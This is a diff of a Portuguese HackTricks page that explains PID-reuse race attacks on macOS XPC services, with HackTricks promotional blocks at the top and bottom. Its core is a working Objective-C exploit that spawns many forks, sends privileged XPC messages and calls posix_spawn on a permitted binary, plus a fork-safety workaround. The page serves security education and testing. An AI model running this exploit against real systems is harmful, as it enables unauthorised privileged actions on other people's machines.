@@ -1,10 +1,10 @@
-## Reutilização de PID do macOS
+# Reutilização de PID no macOS
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -14,24 +14,24 @@
 
 ## Reutilização de PID
 
-Quando um serviço **XPC do macOS** está verificando o processo chamado com base no **PID** e não no **token de auditoria**, ele é vulnerável a um ataque de reutilização de PID. Este ataque é baseado em uma **condição de corrida** em que um **exploit** vai **enviar mensagens para o XPC** abusando da funcionalidade e logo **após** isso, executando **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** com o binário **permitido**.
+Quando um serviço **XPC** do macOS verifica o processo chamado com base no **PID** e não no **token de auditoria**, ele está vulnerável a um ataque de reutilização de PID. Esse ataque é baseado em uma **condição de corrida** em que um **exploit** vai **enviar mensagens para o XPC** abusando da funcionalidade e, **logo após**, executar **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** com o **binário permitido**.
 
-Esta função fará com que o binário **permitido possua o PID**, mas a **mensagem XPC maliciosa terá sido enviada** logo antes. Então, se o serviço **XPC** usar o **PID** para **autenticar** o remetente e verificar isso **DEPOIS** da execução do **`posix_spawn`**, ele pensará que vem de um processo **autorizado**.
+Essa função fará com que o **binário permitido possua o PID**, mas a **mensagem XPC maliciosa terá sido enviada** logo antes. Portanto, se o serviço **XPC** usar o **PID** para **autenticar** o remetente e verificar isso **APÓS** a execução do **`posix_spawn`**, ele pensará que vem de um processo **autorizado**.
 
 ### Exemplo de exploit
 
-Se você encontrar a função **`shouldAcceptNewConnection`** ou uma função chamada por ela **chamando** **`processIdentifier`** e não chamando **`auditToken`**. É altamente provável que esteja verificando o PID do processo e não o token de auditoria.\
-Como por exemplo nesta imagem (tirada da referência):
+Se você encontrar a função **`shouldAcceptNewConnection`** ou uma função chamada por ela que **chame** **`processIdentifier`** e não chame **`auditToken`**, é altamente provável que esteja verificando o PID do processo e não o token de auditoria.\
+Como por exemplo nesta imagem (retirada da referência):
 
-<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Verifique este exemplo de exploit (novamente, retirado da referência) para ver as 2 partes do exploit:
 
 * Uma que **gera vários forks**
-* **Cada fork** irá **enviar** a **carga útil** para o serviço XPC enquanto executa **`posix_spawn`** logo após o envio da mensagem.
+* **Cada fork** irá **enviar** o **payload** para o serviço XPC enquanto executa **`posix_spawn`** logo após o envio da mensagem.
 
 {% hint style="danger" %}
-Para que o exploit funcione, é importante exportar OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES ou colocar no exploit:
+Para que o exploit funcione, é importante exportar export OBJC\_DISABLE\_INITIALIZE\_FORK\_SAFETY=YES ou colocar no exploit:
 ```objectivec
 asm(".section __DATA,__objc_fork_ok\n"
 "empty:\n"
@@ -83,63 +83,63 @@ extern char **environ;
 
 void child() {
 
-    // send the XPC messages
-    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
-    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
-    xpcConnection.remoteObjectInterface = remoteInterface;
+// send the XPC messages
+NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
+NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
+xpcConnection.remoteObjectInterface = remoteInterface;
 
-    [xpcConnection resume];
-    [xpcConnection.remoteObjectProxy restartOS];
+[xpcConnection resume];
+[xpcConnection.remoteObjectProxy restartOS];
 
-    char target_binary[] = BINARY;
-    char *target_argv[] = {target_binary, NULL};
-    posix_spawnattr_t attr;
-    posix_spawnattr_init(&attr);
-    short flags;
-    posix_spawnattr_getflags(&attr, &flags);
-    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
-    posix_spawnattr_setflags(&attr, flags);
-    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
+char target_binary[] = BINARY;
+char *target_argv[] = {target_binary, NULL};
+posix_spawnattr_t attr;
+posix_spawnattr_init(&attr);
+short flags;
+posix_spawnattr_getflags(&attr, &flags);
+flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
+posix_spawnattr_setflags(&attr, flags);
+posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
 }
 
 bool create_nstasks() {
 
-    NSString *exec = [[NSBundle mainBundle] executablePath];
-    NSTask *processes[RACE_COUNT];
+NSString *exec = [[NSBundle mainBundle] executablePath];
+NSTask *processes[RACE_COUNT];
 
-    for (int i = 0; i < RACE_COUNT; i++) {
-        processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
-    }
+for (int i = 0; i < RACE_COUNT; i++) {
+processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
+}
 
-    int i = 0;
-    struct timespec ts = {
-        .tv_sec = 0,
-        .tv_nsec = 500 * 1000000,
-    };
+int i = 0;
+struct timespec ts = {
+.tv_sec = 0,
+.tv_nsec = 500 * 1000000,
+};
 
-    nanosleep(&ts, NULL);
-    if (++i > 4) {
-        for (int i = 0; i < RACE_COUNT; i++) {
-            [processes[i] terminate];
-        }
-        return false;
-    }
+nanosleep(&ts, NULL);
+if (++i > 4) {
+for (int i = 0; i < RACE_COUNT; i++) {
+[processes[i] terminate];
+}
+return false;
+}
 
-    return true;
+return true;
 }
 
 int main(int argc, const char * argv[]) {
 
-    if(argc > 1) {
-        // called from the NSTasks
-        child();
+if(argc > 1) {
+// called from the NSTasks
+child();
 
-    } else {
-        NSLog(@"Starting the race");
-        create_nstasks();
-    }
+} else {
+NSLog(@"Starting the race");
+create_nstasks();
+}
 
-    return 0;
+return 0;
 }obj
 ```
 ## Referências
@@ -151,10 +151,10 @@ int main(int argc, const char * argv[]) {
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
